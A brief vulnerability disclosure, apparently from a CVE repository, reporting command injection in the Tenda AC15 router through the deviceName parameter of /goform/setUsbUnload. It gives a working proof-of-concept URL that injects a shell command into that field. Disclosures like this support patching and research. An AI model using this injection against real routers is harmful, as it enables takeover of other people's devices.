Tengda router AC15 exists command execution

Firmware download address：https://www.tenda.com.cn/download/detail-2680.html

version:AC15

After analyzing routes, the deviceName parameter is controllable, so that the command is executed

![WPS图片(1)](https://github.com/RCEraser/cve/assets/131632691/656018d0-1eff-41e8-be29-52265b675f29)

Payload
http://x.x.x.x/goform/setUsbUnload?deviceName=`echo '111'`>/tmp/bb.txt`

![WPS图片(2)](https://github.com/RCEraser/cve/assets/131632691/9041de24-aea8-4cc0-a9f3-86aedd9032f5)
